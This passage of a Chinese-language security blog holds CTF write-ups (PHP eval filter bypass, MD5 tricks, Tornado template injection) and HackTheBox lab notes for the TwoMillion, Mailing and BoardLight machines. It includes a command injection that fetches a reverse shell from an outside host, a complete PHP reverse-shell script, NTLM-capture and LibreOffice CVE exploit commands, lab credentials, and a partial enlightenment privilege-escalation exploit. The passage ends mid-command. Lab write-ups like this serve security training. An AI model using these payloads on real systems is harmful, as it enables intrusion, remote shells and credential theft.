class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$str</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$blacklist</span> = [<span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;\\t&#x27;</span>, <span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\n&#x27;</span>,<span class=\"string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"string\">&#x27;&quot;&#x27;</span>, <span class=\"string\">&#x27;`&#x27;</span>, <span class=\"string\">&#x27;\\[&#x27;</span>, <span class=\"string\">&#x27;\\]&#x27;</span>,<span class=\"string\">&#x27;\\$&#x27;</span>,<span class=\"string\">&#x27;\\\\&#x27;</span>,<span class=\"string\">&#x27;\\^&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$blacklist</span> <span class=\"keyword\">as</span> <span class=\"variable\">$blackitem</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$blackitem</span> . <span class=\"string\">&#x27;/m&#x27;</span>, <span class=\"variable\">$str</span>)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;what are you want to do?&quot;</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"string\">&#x27;echo &#x27;</span>.<span class=\"variable\">$str</span>.<span class=\"string\">&#x27;;&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>然后发现 num 里面有字母时也会被 WAF 拦下来，比如 <code>?num=a</code> 时就不行，这时候就有个骚操作，可以在 <code>num</code> 前面加个空格或者 <code>+</code>，这样就能绕过 WAF 了，但是 PHP 在解析参数的时候会把空格或者 <code>+</code> 去掉。<br>那么我们 <code>? num=var_dump(scandir(chr(47)))</code> 看下目录内容，为了绕过黑名单只能用 ASCII码，<code>chr(47)</code> 就是 <code>/</code>，也就是相当于 <code>ls /</code>，看到有个 <code>f1agg</code>，用 <code>file_get_contents</code> 读出来就行，payload 为 <code>? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code>。</p>\n<h3 id=\"极客大挑战-2019-BuyFlag\"><a href=\"#极客大挑战-2019-BuyFlag\" class=\"headerlink\" title=\"[极客大挑战 2019]BuyFlag\"></a>[极客大挑战 2019]BuyFlag</h3><p>MENU 跳到 <code>pay.php</code>，F12 看到源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$password</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">elseif</span> (<span class=\"variable\">$password</span> == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>又要 password 不是数字，又要 password 是 404，那还是 PHP 的弱类型比较，搞个 <code>404a</code> 传过去，发现没反应，根据他的要求再 POST 个 <code>money</code> 过去，还是没反应，看 wp 才发现有个 <code>user</code> 的 cookie 要改成 1，这时有反应了，说 <code>money</code> 太长。<br>PHP 5.3 有个关于 <code>strcmp</code> 的漏洞，就是数据类型不同的时候，<code>strcmp</code> 会返回 0，所以这里的 payload 是 <code>?password=404a&amp;money[]=1</code>，就是把 <code>money</code> 干成数组，就得到 flag了。</p>\n<h3 id=\"BJDCTF2020-Easy-MD5\"><a href=\"#BJDCTF2020-Easy-MD5\" class=\"headerlink\" title=\"[BJDCTF2020]Easy MD5\"></a>[BJDCTF2020]Easy MD5</h3><p>随便输个 <code>1</code>，一看响应头有个 hint：<code>Hint: select * from &#39;admin&#39; where password=md5($pass,true)</code>，好，那就搞搞 MD5。<br>首先 MD5 出来的是一个 128 位的散列值，然后 PHP 的 <code>md5</code> 函数后面的 <code>true</code> 是指返回二进制格式的散列值，但是这个二进制串会进行 ASCII 码转换成字符串，类似 python 里的 <code>str(long_to_bytes())</code>。<br>wp 中选择了 <code>ffifdyop</code> 作为 payload，其 MD5 值为 <code>276f722736c95d99e921722cf9ed621c</code>，前面的 <code>27 6f 72 27 36</code> 对应的字符为 <code>&#39;or&#39;6</code>，这样就可以进行一个 SQL 注入，拼凑出 <code>select * from &#39;admin&#39; where password=&#39;&#39;or&#39;6...&#39;</code>，后面还会跟着一堆乱码，但是 <code>6...</code> 会被当成数字，所以就一定为真。<br>然后跳到了 <code>levels91.php</code>，F12 看到：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"variable\">$GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$a</span> != <span class=\"variable\">$b</span> &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$a</span>) == <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$b</span>))&#123;</span><br><span class=\"line\">    <span class=\"comment\">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></figure>\n\n<p><code>$GET</code> 感觉是错的，真随意。后面的 if 语句有两种方法绕过，一种是找到两个不同的字符串，其 MD5 值都是 <code>0e</code> 后面跟数字，这样的话 PHP 会当成是科学计数法，其值都为 <code>0</code>，比如 <code>QNKCDZO</code> 和 <code>s878926199a</code>，传参进去后出现如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param1&#x27;</span>]!==<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param2&#x27;</span>]&amp;&amp;<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param1&#x27;</span>])===<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;param2&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里就要用第二种方法了，就是传俩数组进去，<code>md5</code> 函数会返回 <code>null</code>，然后 <code>null</code> 和 <code>null</code> 比较时会返回 <code>true</code>，而且这个方法刚才也能用，即弱比较和强比较通杀。</p>\n<h3 id=\"护网杯-2018-easy-tornado\"><a href=\"#护网杯-2018-easy-tornado\" class=\"headerlink\" title=\"[护网杯 2018]easy_tornado\"></a>[护网杯 2018]easy_tornado</h3><p>打开一看是个目录，有 <code>/flag.txt</code>，<code>/welcome.txt</code> 和 <code>hints.txt</code>，内容分别为 <code>flag in /fllllllllllllag</code>，<code>render</code> 和 <code>md5(cookie_secret+md5(filename))</code> 打开文件的时候 url 变成了 <code>/file?filename=/xxx.txt&amp;filehash=xxx</code>，那我想看 flag 的话应该得搞到 flag 文件的 filehash，那首先得搞到 <code>cookie_secret</code>。<br>题目名字中的 tornado 是一个 Python 的 web 框架，类似 Flask，那么题目是 SSTI 注入，即 Server-Side Template Injection，服务端模板注入。先只传 <code>filename</code> 不传 <code>filehash</code>，他就急了，网页跳转到 <code>/error?msg=Error</code>，网页内容也是 <code>Error</code>，那么考虑对 <code>msg</code> 进行注入。<br>小插曲：这时候太困睡觉去了，第二天再来搞这题时 BUU 在维护了，开摆！<br><code>msg=&#123;&#123;1&#125;&#125;</code> 的时候回显 <code>1</code> 了，有说法，wp 说 <code>cookie_secret</code> 在 <code>handler.settings</code>，这时候 <code>/error?msg=&#123;&#123;handler.settings&#125;&#125;</code> 返回了一串 <code>json</code>，其中确实有我们要找的 <code>cookie_secret</code>。<br>在传 <code>filehash</code> 的时候一开始只拿 <code>fllllllllllllag</code> 去算了，结果不对，还得加上 <code>/</code>。</p>"},{"title":"HackTheBox 笔记 - 1","date":"2024-05-17T12:12:00.000Z","_content":"\n不得不找饭吃了。\nTwo Million / Mailing / BoardLight / Usage\n\n<!--more-->\n\n## 配置\n\n国内访问比较慢，生成 VPN 的时候选 TCP，然后在下载的 `.ovpn` 文件里加一行 `http-proxy ip:port`，再用 `openvpn` 连接就行了，快很多。\n\n## 新手村\n\n四道基础题，基本就是 nmap 扫。\n主要记住一些参数，比如 `-p-` 扫描所有端口，`--min-rate <num>` 设置扫描速率，`-n` 不解析域名，`-sS` SYN 扫描，`-Pn` 不 ping 主机，`--open` 只显示开放端口，`--stats-every <num>` 每扫描多少个端口显示一次统计信息，`-vv` 详细输出。\n\n## Two Million\n\n扫出来两个端口，一个是 80，一个是 22。\n\n访问 80 端口，301 到 2million.htb，改 `etc/host` 加一行 `10.10.11.221    2million.htb`，再访问，发现是个登录页面。\n根据提示找到 `inviteapi.min.js`，内容如下：\n\n```javascript\neval(\n  function (p, a, c, k, e, d) {\n    e = function (c) {\n      return c.toString(36)\n    };\n    if (!''.replace(/^/, String)) {\n      while (c--) {\n        d[c.toString(a)] = k[c] ||\n        c.toString(a)\n      }\n      k = [\n        function (e) {\n          return d[e]\n        }\n      ];\n      e = function () {\n        return '\\\\w+'\n      };\n      c = 1\n    };\n    while (c--) {\n      if (k[c]) {\n        p = p.replace(new RegExp('\\\\b' + e(c) + '\\\\b', 'g'), k[c])\n      }\n    }\n    return p\n  }(\n    '1 i(4){h 8={\"4\":4};$.9({a:\"7\",5:\"6\",g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:\"7\",5:\"6\",b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',\n    24,\n    24,\n    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),\n    0,\n    {\n    }\n  )\n)\n```\n\n打开 [de4js](https://lelinhtinh.github.io/de4js/) 去混淆得到：\n\n```javascript\nfunction verifyInviteCode(code) {\n    var formData = {\n        \"code\": code\n    };\n    $.ajax({\n        type: \"POST\",\n        dataType: \"json\",\n        data: formData,\n        url: '/api/v1/invite/verify',\n        success: function (response) {\n            console.log(response)\n        },\n        error: function (response) {\n            console.log(response)\n        }\n    })\n}\n\nfunction makeInviteCode() {\n    $.ajax({\n        type: \"POST\",\n        dataType: \"json\",\n        url: '/api/v1/invite/how/to/generate',\n        success: function (response) {\n            console.log(response)\n        },\n        error: function (response) {\n            console.log(response)\n        }\n    })\n}\n```\n\n执行\n\n```bash\ncurl http://2million.htb/api/v1/invite/how/to/generate -X POST\n```\n\n得到\n\n```json\n{\"0\":200,\"success\":1,\"data\":{\"data\":\"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr\",\"enctype\":\"ROT13\"},\"hint\":\"Data is encrypted ... We should probbably check the encryption type in order to decrypt it...\"}\n```\n\n直接 CyberChef 解 ROT13 得到 In order to generate the invite code, make a POST request to \\/api\\/v1\\/invite\\/generate。\n好吧，改个 PATH，再 POST 一下，得到\n\n```json\n{\"0\":200,\"success\":1,\"data\":{\"code\":\"QUtZOEYtMENKMzMtSEE5OVEtS1VHTzQ=\",\"format\":\"encoded\"}}\n```\n\n解码得到 `PBBOO-D9FOB-9BVZP-KCGHW`，不知道为什么 POST 到 `/api/v1/invite/verify` 的结果是 invalid。不管。\n\n注册登录后，顺着提示点击 Connection Pack，下载链接为 `/api/v1/user/vpn/generate`。\n访问 `/api/v1`，得到一堆 API。\n\n```plain\nv1\n  user\n    GET\n      /api/v1 \"Route List\"\n      /api/v1/invite/how/to/generate \"Instructions on invite code generation\"\n      /api/v1/invite/generate \"Generate invite code\"\n      /api/v1/invite/verify \"Verify invite code\"\n      /api/v1/user/auth \"Check if user is authenticated\"\n      /api/v1/user/vpn/generate \"Generate a new VPN configuration\"\n      /api/v1/user/vpn/regenerate \"Regenerate VPN configuration\"\n      /api/v1/user/vpn/download \"Download OVPN file\"\n    POST \n      /api/v1/user/register \"Register a new user\"\n      /api/v1/user/login \"Login with existing user\"\n  admin \n    GET \n      /api/v1/admin/auth \"Check if user is admin\"\n    POST \n      /api/v1/admin/vpn/generate \"Generate VPN for specific user\"\n    PUT \n      /api/v1/admin/settings/update \"Update user settings\"\n```\n\n发现 `/api/v1/admin/settings/update` 能改管理员身份，传一个\n\n```json\n{\n  \"email\": \"a@a.com\",\n  \"is_admin\":1\n}\n```\n\n就能把自己改成 admin。\n\n对 `/api/v1/admin/vpn/generate` 进行命令注入：\n\n```json\n{\n\"username\": \"abc;curl 10.10.14.20:5555/rshell.py | python3;ls\"\n}\n```\n\n把 shell 弹出来。\n`cat .env` 看到\n\n```conf\nDB_HOST=127.0.0.1\nDB_DATABASE=htb_prod\nDB_USERNAME=admin\nDB_PASSWORD=SuperDuperPass123\n```\n\n连一下数据库\n\n```bash\nmysql --user admin --password htb_prod\n```\n\n发现里面没啥有用的，用数据库的密码试一下 ssh，发现密码是相同的。于是登上 admin，然后读 `user.txt` 拿到第一个 flag。\n\n然后根据提示找到 `/var/mail/admin`，里面说 OverlayFS 有 CVE，定位到 CVE-2023-0386。\n\n用[这个 PoC](https://github.com/xkaneiki/CVE-2023-0386) 打一下就行了。\n后面题目问 GLIBC 版本，执行 `ldd --version` 即可。\n\n还留下了一个 CVE-2023-4911，有空再看。\n\n### CVE-2023-0386\n\n下面来详细分析一下这个 CVE。\n\n#### FUSE\n\nFUSE(Filesystem in Userspace)\n\n## Mailing\n\nVMWare 的 Kali GUI 崩了，登录完直接黑屏，我之前也忘了存个快照，于是现在就采用纯命令行 + 代理转发的形式用，反正 GUI 里也只图个 Browser 和 Burpsuite。\n\n还是用的 squid，squid.conf 按下面配置，再重启一下服务就行。\n\n```plain\nacl all src all\nhttp_access allow all\nhosts_file /etc/hosts\nhttp_port 3128\n```\n\nBurpsuite 里 settings -> Network -> Connection -> Upstream Proxy Servers，设置好代理，然后就能用了。\nnmap 一扫发现一堆端口，基本都是邮件服务相关，结果如下：\n\n```plain\nPORT      STATE SERVICE\n25/tcp    open  smtp\n80/tcp    open  http\n110/tcp   open  pop3\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n143/tcp   open  imap\n445/tcp   open  microsoft-ds\n465/tcp   open  smtps\n587/tcp   open  submission\n993/tcp   open  imaps\n5040/tcp  open  unknown\n5985/tcp  open  wsman\n7680/tcp  open  pando-pub\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n50304/tcp open  unknown\n```\n\ndirsearch 扫出 `/assets/` 和 `/download.php`。\n`/assets/` 存着一些图片，`/download.php` 可以任意文件读。\n由前面扫到的端口可知这是一个 hMailServer，所以可以直接读 `hMailServer.INI`。\n`?file=../../../../../../../../../Program%20Files%20(x86)/hMailServer/Bin/hMailServer.INI` 读出如下内容：\n\n```ini\n[Directories]\nProgramFolder=C:\\Program Files (x86)\\hMailServer\nDatabaseFolder=C:\\Program Files (x86)\\hMailServer\\Database\nDataFolder=C:\\Program Files (x86)\\hMailServer\\Data\nLogFolder=C:\\Program Files (x86)\\hMailServer\\Logs\nTempFolder=C:\\Program Files (x86)\\hMailServer\\Temp\nEventFolder=C:\\Program Files (x86)\\hMailServer\\Events\n[GUILanguages]\nValidLanguages=english,swedish\n[Security]\nAdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7\n[Database]\nType=MSSQLCE\nUsername=\nPassword=0a9f8ad8bf896b501dde74f08efd7e4c\nPasswordEncryption=1\nPort=0\nServer=\nDatabase=hMailServer\nInternal=1\n```\n\nadmin 的密码 hash 为 841bb5acfa6779ae432fd7a4e6600ba7，用 hash-identifier 判断是 MD5，用在线网站解密得到 `homenetworkingadministrator`。\n\nmd5 在线解密的网站有 [Hashes](https://hashes.com/zh/decrypt/hash)，[crackstation](https://crackstation.net/) 等。\n\n用 CVE-2024-21413 打，参考[这篇文章](https://www.freebuf.com/vuls/396256.html)，先启动 NTLM 监听\n\n```bash\nsudo impacket-smbserver -smb2support -ip 0.0.0.0 test /tmp\n```\n\n再用 [PoC](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability) 打\n\n```bash\npython3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\\\10.10.14.20\\test' --subject Hi\n```\n\n拿到 maya 的 NTLM hash\n\n```plain\nmaya::MAILING:aaaaaaaaaaaaaaaa:21bf11591531fc6d3736359f495482b4:0101000000000000804c7084b5b1da013e5cd1bc6af81a5f000000000100100057005a00720067005a00460043005a000300100057005a00720067005a00460043005a00020010004f007100510070005500580055006800040010004f00710051007000550058005500680007000800804c7084b5b1da0106000400020000000800300030000000000000000000000000200000146f2fe8ad5fb58c04447d1f84d31aa0faae084bb712011964e5eb9820bf33200a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320030000000000000000000\n```\n\n放到 `1.txt`，用 hashcat 爆\n\n```bash\nhashcat -a 0 -o passwd.txt 1.txt /usr/share/wordlists/rockyou.txt\n```\n\n`-a 0` 意思是字典模式，`-o passwd.txt` 是输出文件，`1.txt` 是输入文件，`/usr/share/wordlists/rockyou.txt` 是字典文件。\n爆出来密码是 `m4y4ngs4ri`。\n然后用红队神器 evil-winrm 连上，拿到 Windows 的 shell，读 `user.txt` 拿到第一个 flag。\n\n```bash\nevil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri\n```\n\n很奇怪这里用 hash 登录不行，会报错 `Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError`。\n\n现在就要开始提权了。\n\nProgram Files 里有个 `LibreOffice`，查看 `readme_en-US.txt` 可以知道版本是 7.4。\n搜出是有 CVE-2023-2255 的，用 [PoC](https://github.com/elweth-sec/CVE-2023-2255) 打\n把反弹 shell 的  `shell.py` 传到 `C:\\Users\\maya\\Documents\\`，然后本地生成 `exploit.odt`，再在 Windows 上 curl 下来。\n\n```bash\npython3 CVE-2023-2255.py --cmd \"python C:\\Users\\maya\\Documents\\shell.py\" --output 'exploit.odt'\n```\n\n在本地挂着 `nc -lvnp <port>`，一会就有 shell 过来了。\n\n弹到 localadmin 的 shell 后，可以直接读桌面的 `root.txt` 拿到 flag，也可以通过以下命令把 maya 提到管理员组：\n\n```bash\nnet localgroup Administradores maya /add\n```\n\n总的来说，这 Windows 的渗透是真迷糊，一点不会。而且不知道为啥 Evil-WinRM 连上后命令卡得要死\n\n## BoardLight\n\n扫出来两个端口，一个是 80，一个是 22。\n一个静态网页，无交互，源码里面有一个 Board.htb，加到 host 里面访问，还是这个页面。\n开始扫子域名\n\n```bash\nwfuzz -c -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u \"http://board.htb\" -H \"Host:FUZZ.board.htb\" --hw 1053\n```\n\n`--hw 1053` 是过滤掉 1053 字节的响应。\n扫到一个 `crm.board.htb`。\n加入 `/etc/hosts` 里，访问到是一个 Dolibarr 的登录页面，随手敲个 admin admin 竟然登上去了，乐。\n新建一个 website，再在里面新建一个 Page，编辑 HTML 源，写 PHP，保存会报 `You add dynamic PHP code that contains the PHP instruction 'system' that is forbidden by default as dynamic content (see hidden options WEBSITE_PHP_ALLOW_xxx to increase list of allowed commands).\n`\n\n大写 PHP 绕过，有时也可以直接短标签 `<?`，或者 `<?=system('ls')?>`，这句等效于 `<?php echo system('ls')?>`。\n在 [Reverse Shell Generator](https://www.revshells.com/) 生成一个 PHP 反弹 shell，然后写进去\n记得勾上 `Show dynamic content`\n\n```php\n<?PHP\n// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '10.10.14.20';\n$port = 55555;\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; bash -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n  $pid = pcntl_fork();\n  \n  if ($pid == -1) {\n    printit(\"ERROR: Can't fork\");\n    exit(1);\n  }\n  \n  if ($pid) {\n    exit(0);  // Parent exits\n  }\n  if (posix_setsid() == -1) {\n    printit(\"Error: Can't setsid()\");\n    exit(1);\n  }\n\n  $daemon = 1;\n} else {\n  printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"/\");\n\numask(0);\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n  printit(\"$errstr ($errno)\");\n  exit(1);\n}\n\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n  printit(\"ERROR: Can't spawn shell\");\n  exit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n  if (feof($sock)) {\n    printit(\"ERROR: Shell connection terminated\");\n    break;\n  }\n\n  if (feof($pipes[1])) {\n    printit(\"ERROR: Shell process terminated\");\n    break;\n  }\n\n  $read_a = array($sock, $pipes[1], $pipes[2]);\n  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n  if (in_array($sock, $read_a)) {\n    if ($debug) printit(\"SOCK READ\");\n    $input = fread($sock, $chunk_size);\n    if ($debug) printit(\"SOCK: $input\");\n    fwrite($pipes[0], $input);\n  }\n\n  if (in_array($pipes[1], $read_a)) {\n    if ($debug) printit(\"STDOUT READ\");\n    $input = fread($pipes[1], $chunk_size);\n    if ($debug) printit(\"STDOUT: $input\");\n    fwrite($sock, $input);\n  }\n\n  if (in_array($pipes[2], $read_a)) {\n    if ($debug) printit(\"STDERR READ\");\n    $input = fread($pipes[2], $chunk_size);\n    if ($debug) printit(\"STDERR: $input\");\n    fwrite($sock, $input);\n  }\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n  if (!$daemon) {\n    print \"$string\\n\";\n  }\n}\n\n?>\n```\n\n拿到 www-data 的 shell\n在 `/var/www/html/crm.board.htb/htdocs/conf/` 下找到 `conf.php`，里面有数据库的用户名和密码\n\n```php\n<?php\n//\n// File generated by Dolibarr installer 17.0.0 on May 13, 2024\n//\n// Take a look at conf.php.example file for an example of conf.php file\n// and explanations for all possibles parameters.\n//\n$dolibarr_main_url_root='http://crm.board.htb';\n$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';\n$dolibarr_main_url_root_alt='/custom';\n$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';\n$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';\n$dolibarr_main_db_host='localhost';\n$dolibarr_main_db_port='3306';\n$dolibarr_main_db_name='dolibarr';\n$dolibarr_main_db_prefix='llx_';\n$dolibarr_main_db_user='dolibarrowner';\n$dolibarr_main_db_pass='serverfun2$2023!!';\n$dolibarr_main_db_type='mysqli';\n$dolibarr_main_db_character_set='utf8';\n$dolibarr_main_db_collation='utf8_unicode_ci';\n// Authentication settings\n$dolibarr_main_authentication='dolibarr';\n\n//$dolibarr_main_demo='autologin,autopass';\n// Security settings\n$dolibarr_main_prod='0';\n$dolibarr_main_force_https='0';\n$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';\n$dolibarr_nocsrfcheck='0';\n$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';\n$dolibarr_mailing_limit_sendbyweb='0';\n$dolibarr_mailing_limit_sendbycli='0';\n\n//$dolibarr_lib_FPDF_PATH='';\n//$dolibarr_lib_TCPDF_PATH='';\n//$dolibarr_lib_FPDI_PATH='';\n//$dolibarr_lib_TCPDI_PATH='';\n//$dolibarr_lib_GEOIP_PATH='';\n//$dolibarr_lib_NUSOAP_PATH='';\n//$dolibarr_lib_ODTPHP_PATH='';\n//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';\n//$dolibarr_js_CKEDITOR='';\n//$dolibarr_js_JQUERY='';\n//$dolibarr_js_JQUERY_UI='';\n\n//$dolibarr_font_DOL_DEFAULT_TTF='';\n//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';\n$dolibarr_main_distrib='standard';\n```\n\n登进数据库\n\n```bash\nmysql -u dolibarrowner -p\n```\n\n然后连上 dolibarr 数据库，查看表\n\n```sql\nuse dolibarr;\nshow tables;\n```\n\n发现没啥东西。\n`ls /home` 发现有个用户叫 larissa，用数据库的密码 ssh 进去，拿到第一个 flag。\n\n然后开始提权\n传个 `linpeas.sh` 过去开扫，发现 SUID 项里有 enlightenment，执行 `enlightenment -version` 可知版本为 0.23.1。\n\n`searchsploit enlightenment` 看到有个提权漏洞，再 `searchsploit -p linux/local/51180.txt` 看具体信息\n\n```yaml\n  Exploit: Enlightenment v0.25.3 - Privilege escalation\n      URL: https://www.exploit-db.com/exploits/51180\n     Path: /usr/share/exploitdb/exploits/linux/local/51180.txt\n    Codes: CVE-2022-37706\n Verified: False\nFile Type: ASCII text\n```\n\n`cat /usr/share/exploitdb/exploits/linux/local/51180.txt`，里面说这个洞能打 0.25.3 以下版本，也给出了 PoC 如下：\n\n```bash\n#!/usr/bin/bash\n# Idea by MaherAzzouz\n# Development by nu11secur1ty\n\necho \"CVE-2022-37706\"\necho \"[*] Trying to find the vulnerable SUID file...\"\necho \"[*] This may take few seconds...\"\n\n# The actual problem\nfile=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)\nif [[ -z ${file} ]]\nthen\n        echo \"[-] Couldn't find the vulnerable SUID file...\"\n        echo \"[*] Enlightenment should be installed on your system.\"\n        exit 1\nfi\n\necho \"[+] Vulnerable SUID binary found!\"\necho \"[+] Trying to pop a root shell!\"\nmkdir -p /tmp/net\nmkdir -p \"/dev/../tmp/;/tmp/exploit\"\n\necho \"/bin/sh\" > /tmp/exploit\nchmod a+x /tmp/exploit\necho \"[+] Welcome to the rabbit hole :)\"\n\n${file} /bin/mount -o 